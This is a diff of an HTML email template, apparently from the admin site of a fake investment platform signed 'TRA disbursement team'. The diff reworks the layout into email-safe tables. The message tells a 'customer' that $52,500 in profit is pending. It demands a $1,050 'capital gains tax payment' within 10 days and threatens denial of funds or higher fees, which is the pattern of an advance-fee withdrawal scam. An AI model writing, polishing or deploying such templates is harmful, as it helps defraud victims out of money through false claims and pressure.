@@ -6,49 +6,69 @@
     <meta content="width=device-width,initial-scale=1" name="viewport">
 </head>
 <body style="margin:0;padding:0;font-family:Arial,sans-serif;background-color:#f9f9f9;color:#333;">
-<!-- Email Wrapper with Background -->
-<div style="background:url('{{ domain }}{% static "admin_site/images/tra.jpg" %}') no-repeat center center; background-size:contain; opacity:0.8; padding:30px;">
-<!-- Centered Content -->
-<div style="background:white;padding:20px;border-radius:10px;box-shadow:0px 4px 6px rgba(0,0,0,0.1);">
-    <div style="display:flex;justify-content:center;width:100%;padding:15px;">
-        <img alt="Company Logo"
-             src="{{ domain }}{% static 'admin_site/images/tra.jpg' %}"
-             style="height:100px;max-width:100%;display:block;"/>
-    </div>
-    <div style="background:black;padding:20px;text-align:center;color:white;border-radius:5px;">
-        <p style="font-size:20px;margin:0;">Follow-Up on Withdrawal Process</p>
-    </div>
-    <div style="padding:20px;">
-        <p style="margin:0 0 10px;">Dear customer,</p>
-        <p style="margin:0 0 20px;line-height:1.5;">
-Thank you for reaching out regarding your withdrawal process.
-        </p>
-        <p style="margin:0 0 20px;line-height:1.5;">
-We would like to inform you that you currently have a pending payment with us amounting
-			to $52,500. To complete this process and receive your profit, you are required
-			to finalize the $1,050 capital gains tax payment.
-
-        </p>
-        <p style="margin:0 0 20px;line-height:1.5;">
-			Note: Please ensure this payment is completed within 10 days,
-			as you have already initiated the payment process. Failure to complete the
-			payment within this time frame may result in the denial of your funds or the
-			need to pay a significantly higher amount to access your profit.
-
-
-        </p>
-        <p style="margin:0;">Should you have any questions or require assistance, feel free to write us or contact your account manager.</p>
-        <br>
-        <p style="margin:0;">Thank you,<br>
-			TRA disbursement team</p>
-        <br>
-        <div style="text-align:center;">
-            <img alt="Company Logo"
-                 src="{{ domain }}{% static 'admin_site/images/tra.jpg' %}"
-                 style="height:200px;width:100%;display:block;margin:0 auto;"/>
-        </div>
-    </div>
-</div>
-</div>
+<!-- Email Wrapper -->
+<table width="100%" border="0" cellspacing="0" cellpadding="0" style="background-color:#f9f9f9;padding:30px 0;">
+    <tr>
+        <td align="center">
+            <!-- Email Content Box -->
+            <table width="600" border="0" cellspacing="0" cellpadding="0" style="background:white;border-radius:10px;box-shadow:0px 4px 6px rgba(0,0,0,0.1);overflow:hidden;">
+                <tr>
+                    <td style="padding:15px;text-align:center;">
+                        <img alt="Company Logo"
+                             src="{{ domain }}{% static 'admin_site/images/tra.jpg' %}"
+                             style="height:150px;width:150px;border-radius:50%;display:block;margin:0 auto;"/>
+                    </td>
+                </tr>
+                <tr>
+                    <td style="background:black;color:white;padding:20px;text-align:center;border-radius:5px;">
+                        <p style="font-size:20px;margin:0;">Follow-Up on Withdrawal Process</p>
+                    </td>
+                </tr>
+                <tr>
+                    <td style="padding:30px;position:relative;">
+                        <!-- Background Image Section -->
+                        <div style="
+                            position:absolute;
+                            top:20px;
+                            left:50%;
+                            transform:translateX(-50%);
+                            width:300px;
+                            height:300px;
+                            background-image:url('{{ domain }}{% static 'admin_site/images/tra.jpg' %}');
+                            background-size:cover;
+                            background-repeat:no-repeat;
+                            background-position:center;
+                            border-radius:50%;
+                            opacity:0.1;">
+                        </div>
+                        <!-- Text Content -->
+                        <div style="position:relative;z-index:2;">
+                            <p style="margin:0 0 10px;">Dear customer,</p>
+                            <p style="margin:0 0 20px;line-height:1.6;">
+                                Thank you for reaching out regarding your withdrawal process.
+                            </p>
+                            <p style="margin:0 0 20px;line-height:1.6;">
+                                We would like to inform you that you currently have a pending payment with us amounting
+                                to $52,500. To complete this process and receive your profit, you are required
+                                to finalize the $1,050 capital gains tax payment.
+                            </p>
+                            <p style="margin:0 0 20px;line-height:1.6;">
+                                Note: Please ensure this payment is completed within 10 days,
+                                as you have already initiated the payment process. Failure to complete the
+                                payment within this time frame may result in the denial of your funds or the
+                                need to pay a significantly higher amount to access your profit.
+                            </p>
+                            <p style="margin:0;">Should you have any questions or require assistance, feel free to write us or contact your account manager.</p>
+                            <br>
+                            <p style="margin:0;">Thank you,<br>
+                                TRA Disbursement Team</p>
+                            <br>
+                        </div>
+                    </td>
+                </tr>
+            </table>
+        </td>
+    </tr>
+</table>
 </body>
 </html>
